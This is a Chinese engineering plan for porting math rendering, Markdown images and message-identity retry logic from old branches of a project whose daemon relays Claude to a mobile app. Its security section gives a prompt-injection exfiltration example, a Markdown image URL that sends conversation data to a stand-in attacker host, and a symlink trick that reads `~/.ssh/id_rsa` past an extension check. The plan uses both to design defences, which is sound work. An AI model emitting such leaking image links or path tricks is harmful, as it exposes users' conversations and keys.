# 旧分支功能移植规划

> 状态：待实施。两项移植都完成后，删除本文件和对应的远程旧分支。

## 1. 结论

`feat/md-rich` 和 `feat/chat-reliability-streaming` 从很早的主线分出，整支合并会带回已删除的 `web/ui`、`.trellis` 和旧 Web 资源，因此不合并分支，只按功能手工移植。

先做公式与 Markdown 图片，再做消息可靠性。前者改动集中、风险可控；后者会改发送流程，而且当前代码已经覆盖了旧分支的大部分内容，真正要带过来的只有“消息身份”这一块。

## 2. 前提

1. 提交本文件、`AGENTS.md` 和 `CLAUDE.md`。
2. 把 `feat/cli-tui` 合入 `main`。`main` 目前没有最近的提交，先合并才能让新分支从最新代码开始。
3. 每项移植单独开分支和草稿 PR，遵守 `AGENTS.md` 的分支规则。

## 3. 公式与 Markdown 图片

分支：`feat/md-math-images`。来源提交：`origin/feat/md-rich` 的 `ac41f3c`。

### 3.1 改动范围

| 文件 | 处理 |
| --- | --- |
| `web/core/md-math.js` 及测试 | 直接带过来 |
| `web/core/md-image.js` 及测试 | 带过来，按 3.2 修改 |
| `app/src/lib/tex-svg.js` 及测试 | 带过来，改为首次遇到公式时才加载 |
| `app/src/components/markdown/MathView.js` | 直接带过来 |
| `app/src/components/markdown/MdImage.js` | 带过来，全屏查看改用现有的 `ImageViewer` |
| `app/src/components/markdown/MarkdownView.js` | 手工合入 `math`、`image` 分支和 `imageOnly`，保留现有 highlight.js 高亮 |
| `app/src/components/MessageRow.js`、`app/src/screens/ChatScreen.js` | 给 `MarkdownView` 传 `sessionId` |
| `packages/daemon/src/server.ts` 及测试 | 新增 `GET /api/sessions/:id/file`，按 3.2 修改 |
| `app/package.json` | 增加 `mathjax-full` 3.2.2 |

不带：`web/core/highlight.js`（已有 highlight.js 方案）、`web/ui`、`web/style.css`、KaTeX 字体。

注意：`marked.lexer` 必须带上 `marked.defaults`，否则公式扩展不生效。

### 3.2 必须修改的地方

旧代码不能原样搬，下面几点是这次移植新增的要求。

**远程图片不自动加载。** 回复内容可能来自 Claude 读到的恶意网页。如果回复里出现 `![](https://攻击者地址/?data=对话内容)`，手机一渲染就会把数据发出去。远程图片默认显示占位，用户点击后才加载；本机图片和 `data:` 图片可以自动显示。

**接口不跟随符号链接绕过检查。** 旧代码只检查路径的扩展名，而 `stat` 和读取都会跟随符号链接，所以 `a.png` 指向 `~/.ssh/id_rsa` 时能读到私钥。改为先 `realpath`，再对真实路径检查扩展名和大小。

**读文件失败不能影响 daemon。** 旧代码的 `createReadStream(target).pipe(res)` 没有处理错误，文件在 `stat` 之后被删除时可能导致进程崩溃。改用和 `#serveUpload` 一样的 `readFile`，大小上限复用 `UPLOAD_LIMIT_BYTES`，与 relay 的默认上限保持一致。

**去掉 SVG。** React Native 的 `Image` 不能显示 SVG，放行没有意义，还要额外处理脚本风险。从接口和 `md-image.js` 的扩展名名单里都去掉，接口也只保留 `GET`。

**去掉 localhost 改写。** 旧代码把 `localhost` 换成当前主机名，但走 relay 时这个主机名是 relay，请求不会到达 Mac。这类地址直接显示为链接。

**公式按需加载。** MathJax 在 JS 线程上同步运行，启动时加载会拖慢所有用户。`tex-svg.js` 改为第一次渲染公式时才 `require`。

### 3.3 验证

- 自动测试：`pnpm test`、`pnpm typecheck`；接口测试要覆盖未带 token、非图片、符号链接指向非图片、超限、文件不存在。
- 导出 iOS Hermes bundle，记录增加的体积。若增加明显，再评估减少 TeX 包；`mathjax-full` 已被 npm 标记为由 `@mathjax/src` 取代，这次先用旧分支测过的 3.2.2。
- 真机检查：行内和块级公式、流式输出时的半截公式、`$5 和 $10`、长公式横向滚动、本机图片、远程图片点击加载、深色模式、走 relay 时的本机图片。

## 4. 消息可靠性

分支：`feat/chat-client-message-id`。来源提交：`origin/feat/chat-reliability-streaming` 的 `e51ea4c`。

### 4.1 当前已有与缺失

| 能力 | 现状 | 处理 |
| --- | --- | --- |
| WS 应用层心跳 | `web/core/ws.js` 和 daemon 已有 | 不带 `ws-heartbeat.js` |
| 重连恢复流式内容 | 订阅时由 `#streams.snapshot` 补发草稿，已有草稿去重 | 不带 `stream_snapshot` |
| 重连补消息和运行状态 | ChatScreen 已补拉并恢复运行状态 | 不带 `conversation-state.js` |
| 订阅确认 | 订阅成功后已发送会话状态帧，可起到确认作用 | 不带 `subscribed` 帧 |
| 消息身份 | 用文本匹配回显（`isEcho`），连发两条相同内容会匹配错 | **要带** |
| 发送失败重试 | 失败后退回输入框并提示，网络中断时无法判断是否已发出 | **要带** |

同样不带：`web/ui`、mock server、`.trellis` 任务文档、单气泡样式调整（当前气泡已经改过）。

### 4.2 实施步骤

1. **先验证 SDK 行为。** 当前 SDK 是 0.3.212，比旧分支新。先确认 `SDKUserMessage.uuid` 仍会写入 JSONL。如果不会，就不能用 JSONL 回显匹配，改由 daemon 记录 `runId` 与 `clientMessageId` 的对应关系后再继续。
2. **agent-bridge。** `userMessage(prompt, uuid)` 接收 id，`clientMessageId` 进入发送选项。
3. **daemon。** `POST /api/sessions` 和 `POST /api/sessions/:id/messages` 接收可选的 `clientMessageId`，校验为 UUID，透传给 runner，并在响应里返回。
4. **daemon 幂等。** 旧分支没有这一步，但重试必须依赖它：请求已送达、响应丢失时，客户端重试会让 Claude 再执行一遍。在内存里按会话保存 `clientMessageId → runId`，保留 10 分钟，重复请求直接返回原 `runId`。daemon 重启后记录丢失，这种极端情况可接受。
5. **App 发送状态。** 发送前生成 id（复用旧分支的 `newClientMessageId`，Hermes 没有 `crypto.randomUUID` 时走兜底）。`pending` 增加 id 和状态：发送中、已发送、失败、状态不明。明确失败时保留气泡并提供重试；网络中断时显示状态不明，补拉历史后按 id 确认。
6. **App 回显匹配。** `isEcho` 优先比较 `uuid`，比不上时再比较文本。文本匹配要保留，用来兼容旧 daemon 和终端里发出的消息。
7. **重试。** 使用原 `clientMessageId` 和原文本，不重新上传附件。

### 4.3 验证

- daemon：同一 id 重复请求只启动一次运行；非法 id 返回 400；不带 id 的旧请求行为不变。
- App：连发两条相同内容都能正确回显；响应丢失后重试不重复；明确失败后可重试；状态不明时能从历史确认；回显先于响应到达时不重复显示。
- 兼容：新 App 连旧 daemon 能正常发送，只是没有精确匹配。
- 真机检查：发送途中切飞行模式、切换 relay、杀掉 App 后重开。

## 5. 收尾

两项都合入 `main` 后：

1. 删除远程 `feat/md-rich` 和 `feat/chat-reliability-streaming`。
2. 删除本文件，把最终接口写入 `docs/architecture.md`。
